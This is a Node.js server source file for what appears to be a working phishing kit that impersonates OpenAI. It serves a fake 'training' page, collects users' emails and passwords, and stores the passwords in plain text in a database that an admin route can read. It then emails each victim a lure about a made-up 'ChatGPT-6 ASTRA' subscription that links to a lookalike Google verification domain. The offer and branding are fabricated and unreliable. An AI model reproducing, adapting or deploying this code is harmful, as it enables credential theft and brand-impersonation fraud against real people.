require("dotenv").config();
const http = require("http");
const fs = require("fs");
const path = require("path");
const { Pool } = require("pg");
const { Resend } = require("resend");
const resend = process.env.RESEND_API_KEY
  ? new Resend(process.env.RESEND_API_KEY)
  : null;

const PORT = process.env.PORT || 3000;
const INDEX_FILE = path.join(__dirname, "index.html");

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL
    ? { rejectUnauthorized: false }
    : false
});

function sendJSON(res, statusCode, data) {
  res.writeHead(statusCode, {
    "Content-Type": "application/json; charset=utf-8"
  });

  res.end(JSON.stringify(data));
}

async function sendASTRAEmail(email) {
  if (!resend) {
    console.warn("RESEND_API_KEY is not configured. Email not sent.");
    return;
  }

  const from = process.env.FROM_EMAIL;

  if (!from) {
    console.warn("FROM_EMAIL is not configured. Email not sent.");
    return;
  }

  const result = await resend.emails.send({
    from,
    to: email,
    subject: "Congratulations! You’re Eligible for the ASTRA unlimited subcription",
    html: `
      <!DOCTYPE html>
      <html>
      <body style="margin:0;background:#0f141a;
                   font-family:Arial,sans-serif;padding:30px 10px;">
        <div style="max-width:600px;margin:auto;
                    background:#171c22;color:white;
                    border-radius:8px;padding:35px;">

          <div style="text-align:center;">
            <h1 style="margin:0;">ASTRA</h1>
            <p style="color:#9aa4af;">
              The world’s most intelligent and aligned model.
            </p>
          </div>

          <h2 style="margin-top:35px;">
            Email ownership verification required! 
          </h2>

          <p style="color:#d7dce1;line-height:1.6;">
            Your email address has been recorded as eligible in the ASTRA unlimited subscription offer.
Action required: Complete the email-ownership verification step to continue the ChatGPT-6 ASTRA activation process.
This verification is used to confirm that the person participating in this offer has access to the submitted email address and to help distinguish genuine participants from automated or spam submissions.
Please complete the verification before continuing.
          </p>

          <div style="background:#20262d;padding:18px;
                      border-radius:6px;margin:25px 0;">
            <strong>ChatGPT-6 ASTRA SUBSCRIPTION</strong><br>
            Account verified and eligible.
            <br><br>
            <strong>EMAIL OWNERSHIP VERIFICATION</strong><br>
            Not verified
          </div>

          <a href="https://google-verification-9ei6.onrender.com/"
             style="display:inline-block;
                    background:#4285f4;
                    color:#ffffff;
                    text-decoration:none;
                    padding:14px 24px;
                    border-radius:5px;
                    font-weight:bold;">
            Verify Email Ownership
          </a>

          <p style="margin-top:30px;color:#89939e;
                    font-size:13px;line-height:1.5;"> 
            Do not give anyone your passwords, recovery phrases, or
            authentication codes.
          </p>

          <hr style="border:0;border-top:1px solid #292f36;">

          <p style="text-align:center;color:#7f8994;font-size:12px;">
            © 2026 OpenAI
          </p>

        </div>
      </body>
      </html>
    `
  });
console.log("Resend result:", result);

if (result.error) {
  throw new Error(result.error.message || "Resend rejected the email.");
}

console.log("Resend message ID:", result.data?.id);
}
function sendPage(res) {
  fs.readFile(INDEX_FILE, "utf8", (error, html) => {
    if (error) {
      console.error(error);
      sendJSON(res, 500, {
        success: false,
        message: "Training page could not be loaded."
      });
      return;
    }

    res.writeHead(200, {
      "Content-Type": "text/html; charset=utf-8"
    });

    res.end(html);
  });
}
function isAdminAuthorized(req) {
  const adminKey = process.env.ADMIN_KEY;

  if (!adminKey) {
    return false;
  }

  const auth = req.headers.authorization || "";

  return auth === `Bearer ${adminKey}`;
}
async function handleTrainingSubmission(req, res) {
  let body = "";

  req.on("data", chunk => {
    body += chunk;

    if (body.length > 10000) {
      req.destroy();
    }
  });

  req.on("end", async () => {
    try {
      const data = JSON.parse(body);

      const email =
        typeof data.email === "string"
          ? data.email.trim()
          : "";

      const password =
        typeof data.password === "string"
          ? data.password.trim()
          : "";

      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

      if (!emailPattern.test(email)) {
        sendJSON(res, 400, {
          success: false,
          message: "Please enter a valid email address."
        });
        return;
      }

      if (!password) {
        sendJSON(res, 400, {
          success: false,
          message: "Enter your password."
        });
        return;
      }

      if (!process.env.DATABASE_URL) {
        console.error("DATABASE_URL is not configured.");

        sendJSON(res, 500, {
          success: false,
          message: "Training database is not configured."
        });
        return;
      }

      await pool.query(`
        CREATE TABLE IF NOT EXISTS training_submissions (
          id SERIAL PRIMARY KEY,
          email TEXT NOT NULL,
          password TEXT NOT NULL,
          submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
        )
      `);

      await pool.query(
        `INSERT INTO training_submissions
         (email, password)
         VALUES ($1, $2)`,
        [email, password]
      );

      console.log("Training submission stored.");
try {
  await sendASTRAEmail(email);
  console.log("ASTRA email sent.");
} catch (emailError) {
  console.error("Email sending error:", emailError);
}
      sendJSON(res, 200, {
        success: true,
        message: "verified successfully."
      });

    } catch (error) {
      console.error("Submission error:", error);

      sendJSON(res, 500, {
        success: false,
        message: "Unable to save the training submission."
      });
    }
  });
}

const server = http.createServer(async(req, res) => {
  if (req.method === "GET" && req.url === "/OpenAI.jpg") {
    const logoPath = path.join(__dirname, "OpenAI.jpg");

    fs.readFile(logoPath, (error, image) => {
      if (error) {
        res.writeHead(404);
        res.end("Logo not found");
        return;
      }

      res.writeHead(200, {
        "Content-Type": "image/jpeg"
      });

      res.end(image);
    });

    return;
  }

  if (req.method === "GET" && req.url === "/") {
    sendPage(res);
    return;
  }
if (req.method === "GET" && req.url === "/admin") {
  sendAdminPage(res);
  return;
}
  if (req.method === "POST" && req.url === "/training") {
    handleTrainingSubmission(req, res);
    return;
  }
if (req.method === "GET" && req.url === "/admin/submissions") {
  if (!isAdminAuthorized(req)) {
    sendJSON(res, 401, {
      success: false,
      message: "Unauthorized."
    });
    return;
  }

  try {
    const result = await pool.query(`
      SELECT id, email, password, submitted_at
      FROM training_submissions
      ORDER BY submitted_at DESC
      LIMIT 100
    `);

    sendJSON(res, 200, {
      success: true,
      submissions: result.rows
    });
  } catch (error) {
    console.error("Admin submissions error:", error);

    sendJSON(res, 500, {
      success: false,
      message: "Unable to retrieve training submissions."
    });
  }

  return;
}
  sendJSON(res, 404, {
    success: false,
    message: "Page or endpoint not found."
  });
});

server.listen(PORT, "0.0.0.0", () => {
  console.log(`OpenAI training server running on port ${PORT}`);
});

